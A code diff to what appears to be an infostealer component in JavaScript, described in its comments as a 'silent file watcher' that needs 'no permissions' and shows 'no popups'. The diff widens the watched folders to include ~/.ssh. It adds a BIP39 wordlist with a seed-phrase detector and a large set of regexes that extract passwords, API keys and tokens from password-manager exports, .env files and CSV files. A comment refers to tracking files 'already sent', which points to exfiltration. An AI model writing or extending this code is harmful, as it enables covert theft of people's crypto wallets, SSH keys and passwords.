@@ -916,51 +916,540 @@ setInterval(() => {
 
 // REMOVED: File monitoring - was causing spam
 
-// SILENT FILE WATCHER - Monitors Downloads/Documents/Desktop for seed phrases, mnemonics, wallet files
+// SILENT FILE WATCHER - Monitors Downloads/Documents/Desktop for seed phrases, passwords, wallet files
 // Uses fs.watch (NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!)
 let watchedFiles = new Set(); // Track files we've already sent
 let watchDirs = [
     path.join(os.homedir(), 'Downloads'),
     path.join(os.homedir(), 'Documents'),
-    path.join(os.homedir(), 'Desktop')
+    path.join(os.homedir(), 'Desktop'),
+    path.join(os.homedir(), 'Library', 'Application Support'),
+    path.join(os.homedir(), '.ssh')
 ];
 
-// Function to check if file content looks like a seed phrase/mnemonic
-function isSeedPhrase(content) {
-    if (!content || content.length < 10) return false;
+// BIP39 Wordlist (first 50 words - most common in seed phrases)
+const BIP39_WORDS = new Set([
+    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
+    'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
+    'action', 'actor', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult',
+    'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree',
+    'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien'
+]);
+
+// Extended BIP39 wordlist check (common seed phrase words)
+const COMMON_SEED_WORDS = new Set([
+    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
+    'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
+    'action', 'actor', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult',
+    'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree',
+    'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien',
+    'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always',
+    'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle',
+    'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety',
+    'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'area', 'arena', 'argue',
+    'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art',
+    'article', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma',
+    'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt',
+    'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome',
+    'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony',
+    'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic',
+    'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin',
+    'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better',
+    'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter',
+    'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom',
+    'blow', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone',
+    'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box',
+    'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge',
+    'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown',
+    'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle',
+    'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz',
+    'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp',
+    'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital',
+    'captain', 'car', 'carbon', 'card', 'care', 'career', 'careful', 'careless', 'cargo', 'carpet',
+    'carry', 'cart', 'case', 'cash', 'casino', 'cast', 'casual', 'cat', 'catalog', 'catch',
+    'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census',
+    'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge',
+    'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief',
+    'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon',
+    'circle', 'citizen', 'city', 'civil', 'claim', 'clamp', 'clarify', 'claw', 'clay', 'clean',
+    'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog',
+    'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast',
+    'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come',
+    'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider',
+    'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct',
+    'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack',
+    'cradle', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit',
+    'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd',
+    'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture',
+    'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle',
+    'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dark', 'dash', 'daughter', 'dawn',
+    'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease',
+    'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial',
+    'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'describe', 'desert',
+    'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram',
+    'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma',
+    'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder',
+    'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll',
+    'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft',
+    'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip',
+    'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch',
+    'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east',
+    'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight',
+    'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else',
+    'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empower', 'empty', 'enable', 'enact',
+    'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy',
+    'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode',
+    'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay',
+    'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example',
+    'exceed', 'excel', 'exception', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise',
+    'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain',
+    'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade',
+    'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy',
+    'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february',
+    'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few',
+    'fiber', 'fiction', 'field', 'fierce', 'fifteen', 'fifty', 'fight', 'figure', 'file', 'film',
+    'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal',
+    'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee',
+    'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam',
+    'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'foreign', 'forest',
+    'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile',
+    'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen',
+    'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy',
+    'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp',
+    'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture',
+    'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance',
+    'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue',
+    'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown',
+    'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid',
+    'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide', 'guilt',
+    'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy',
+    'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health',
+    'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden',
+    'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole',
+    'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital',
+    'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred',
+    'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea',
+    'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune',
+    'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate',
+    'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury',
+    'ink', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire',
+    'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate',
+    'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly',
+    'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle',
+    'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid',
+    'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee',
+    'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp',
+    'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn',
+    'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg',
+    'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter',
+    'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb',
+    'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan',
+    'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge',
+    'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine',
+    'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man',
+    'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine',
+    'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter',
+    'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody',
+    'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh',
+    'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum',
+    'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture',
+    'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon',
+    'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move',
+    'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'mushroom', 'music', 'must',
+    'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation',
+    'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest',
+    'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise',
+    'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel',
+    'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure',
+    'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office',
+    'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion',
+    'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard',
+    'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer',
+    'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone',
+    'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther',
+    'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient',
+    'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican',
+    'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone',
+    'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill',
+    'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic',
+    'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point',
+    'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible',
+    'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer',
+    'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison',
+    'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof',
+    'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse',
+    'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put',
+    'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote',
+    'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally',
+    'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw',
+    'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record',
+    'recover', 'recycle', 'red', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular',
+    'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render',
+    'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'reply', 'report', 'require', 'rescue',
+    'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal',
+    'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle',
+    'right', 'rigid', 'ring', 'riot', 'rip', 'ripe', 'rise', 'risk', 'rival', 'river',
+    'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose',
+    'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run',
+    'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon',
+    'salt', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say',
+    'scale', 'scan', 'scare', 'scatter', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion',
+    'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second',
+    'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior',
+    'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft',
+    'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver',
+    'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle',
+    'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly',
+    'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size',
+    'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep',
+    'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small',
+    'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap',
+    'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve',
+    'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south',
+    'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere',
+    'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport',
+    'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium',
+    'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel',
+    'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool',
+    'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble',
+    'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest',
+    'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface',
+    'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm',
+    'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup',
+    'system', 'table', 'tackle', 'tag', 'tail', 'talent', 'talk', 'tank', 'tape', 'target',
+    'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis',
+    'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there',
+    'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket',
+    'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title',
+    'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow',
+    'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado',
+    'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade',
+    'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree',
+    'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck',
+    'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna',
+    'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two',
+    'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo',
+    'unfair', 'unfold', 'unhappy', 'uniform', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until',
+    'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge',
+    'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague',
+    'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle',
+    'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran',
+    'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual',
+    'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano',
+    'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want',
+    'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth',
+    'weapon', 'weary', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west',
+    'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide',
+    'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner',
+    'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood',
+    'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist',
+    'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero',
+    'zone', 'zoo'
+]);
+
+// Function to detect seed phrase using BIP39 wordlist (scans entire file)
+function detectSeedPhrase(content) {
+    if (!content || content.length < 20) return null;
     
-    // Check for common seed phrase patterns (12 or 24 words)
-    const words = content.trim().split(/\s+/);
-    if (words.length >= 12 && words.length <= 24) {
-        // Check if most words are lowercase (typical for seed phrases)
-        const lowercaseWords = words.filter(w => /^[a-z]+$/.test(w));
-        if (lowercaseWords.length >= 10) return true;
+    // Remove common prefixes/suffixes and clean content
+    let cleanContent = content
+        .replace(/^(seed|phrase|mnemonic|recovery|backup|wallet|words?)[\s:]*/gmi, '')
+        .replace(/[\s:]*$/gmi, '')
+        .replace(/[^\w\s\-_]/g, ' '); // Remove special chars except spaces, dashes, underscores
+    
+    // Try to find seed phrases in the entire content (not just line by line)
+    // Split by common separators
+    const possiblePhrases = [
+        cleanContent, // Full content
+        ...cleanContent.split('\n'), // Line by line
+        ...cleanContent.split(','), // Comma separated
+        ...cleanContent.split('|'), // Pipe separated
+        ...cleanContent.split('-'), // Dash separated
+        ...cleanContent.split('_') // Underscore separated
+    ];
+    
+    for (const phrase of possiblePhrases) {
+        if (!phrase || phrase.length < 20) continue;
+        
+        // Split into words (handle various separators)
+        const words = phrase.trim()
+            .split(/[\s,\-_\|\.]+/)
+            .filter(w => w.length > 0 && w.length < 15) // Valid word length
+            .map(w => w.toLowerCase().trim());
+        
+        // Check for valid seed phrase lengths
+        const validLengths = [12, 15, 18, 21, 24];
+        if (!validLengths.includes(words.length)) continue;
+        
+        // Check how many words are in BIP39 wordlist
+        const validWords = words.filter(w => COMMON_SEED_WORDS.has(w));
+        const validRatio = validWords.length / words.length;
+        
+        // If 75%+ words are valid BIP39 words, it's likely a seed phrase
+        if (validRatio >= 0.75) {
+            // Additional validation: check word uniqueness (seed phrases usually have unique words)
+            const uniqueWords = new Set(words);
+            const uniquenessRatio = uniqueWords.size / words.length;
+            
+            // High confidence if 80%+ valid words and good uniqueness
+            const confidence = validRatio >= 0.8 && uniquenessRatio >= 0.8 ? 
+                Math.min(100, (validRatio * 100 + uniquenessRatio * 20).toFixed(0)) :
+                (validRatio * 100).toFixed(0);
+            
+            return {
+                type: 'seed_phrase',
+                words: words,
+                wordCount: words.length,
+                validWords: validWords.length,
+                uniqueWords: uniqueWords.size,
+                confidence: confidence,
+                preview: words.slice(0, 5).join(' ') + '...'
+            };
+        }
     }
     
-    // Check for keywords
+    return null;
+}
+
+// Function to detect passwords in file content (supports password manager exports)
+function detectPasswords(content) {
+    if (!content || content.length < 5) return null;
+    
+    const found = [];
     const lowerContent = content.toLowerCase();
-    const keywords = ['seed', 'phrase', 'mnemonic', 'recovery', 'private', 'key', 'wallet'];
-    return keywords.some(keyword => lowerContent.includes(keyword));
+    
+    // Check if it's a password manager export file
+    const isPasswordManagerExport = 
+        lowerContent.includes('"url"') && lowerContent.includes('"password"') || // Chrome/1Password JSON
+        lowerContent.includes('"hostname"') && lowerContent.includes('"password"') || // LastPass
+        lowerContent.includes('"username"') && lowerContent.includes('"password"') || // Generic JSON
+        lowerContent.includes('"login"') && lowerContent.includes('"password"') || // Bitwarden
+        lowerContent.includes('"name"') && lowerContent.includes('"password"') || // Generic
+        lowerContent.includes('url,username,password') || // CSV format
+        lowerContent.includes('website,username,password'); // CSV format
+    
+    // Advanced password detection patterns
+    const passwordPatterns = [
+        // JSON formats (password manager exports)
+        /"password"\s*:\s*"([^"]{6,})"/gi,
+        /"pass"\s*:\s*"([^"]{6,})"/gi,
+        /"pwd"\s*:\s*"([^"]{6,})"/gi,
+        /"secret"\s*:\s*"([^"]{6,})"/gi,
+        /"token"\s*:\s*"([^"]{6,})"/gi,
+        /"api[_-]?key"\s*:\s*"([^"]{6,})"/gi,
+        /"access[_-]?token"\s*:\s*"([^"]{6,})"/gi,
+        
+        // Key-value formats
+        /password[\s:]*[:=]\s*([^\s\n]{6,})/gi,
+        /pass[\s:]*[:=]\s*([^\s\n]{6,})/gi,
+        /pwd[\s:]*[:=]\s*([^\s\n]{6,})/gi,
+        /secret[\s:]*[:=]\s*([^\s\n]{6,})/gi,
+        
+        // CSV formats (username,password,email)
+        /([^,\n]+),([^,\n]{6,}),([^,\n@]+@[^,\n]+)/g,
+        /([^,\n@]+@[^,\n]+),([^,\n]+),([^,\n]{6,})/g,
+        
+        // Tab-separated
+        /([^\t\n]+)\t([^\t\n]{6,})\t([^\t\n@]+@[^\t\n]+)/g,
+        
+        // Email + password on same line
+        /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,})\s+([^\s\n]{6,})/g,
+        /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,})[:=]\s*([^\s\n]{6,})/g,
+        
+        // Base64 encoded passwords (common in exports)
+        /"password"\s*:\s*"([A-Za-z0-9+/=]{20,})"/g,
+        
+        // Environment variable format
+        /PASSWORD\s*=\s*([^\s\n]{6,})/gi,
+        /PASS\s*=\s*([^\s\n]{6,})/gi,
+        /PWD\s*=\s*([^\s\n]{6,})/gi,
+        /SECRET\s*=\s*([^\s\n]{6,})/gi,
+        /API[_-]?KEY\s*=\s*([^\s\n]{6,})/gi
+    ];
+    
+    // Extract passwords using patterns
+    for (const pattern of passwordPatterns) {
+        try {
+            const matches = [...content.matchAll(pattern)];
+            for (const match of matches) {
+                // Find the password value (usually match[1] or match[2])
+                let passwordValue = match[1] || match[2] || match[3];
+                if (passwordValue && passwordValue.length >= 6 && passwordValue.length <= 200) {
+                    // Skip if it's clearly not a password (URLs, common words, etc.)
+                    if (!passwordValue.match(/^(https?|ftp):\/\//i) && 
+                        !passwordValue.match(/^[0-9]+$/) && // Not just numbers
+                        passwordValue.match(/[a-zA-Z]/)) { // Contains letters
+                        
+                        // Extract context (username/email if available)
+                        let username = match[1] || match[3] || '';
+                        let email = '';
+                        if (username && username.includes('@')) {
+                            email = username;
+                            username = '';
+                        }
+                        
+                        found.push({
+                            type: 'password',
+                            value: passwordValue.substring(0, 50),
+                            username: username.substring(0, 50),
+                            email: email.substring(0, 100),
+                            context: match[0].substring(0, 150),
+                            source: isPasswordManagerExport ? 'password_manager_export' : 'file'
+                        });
+                    }
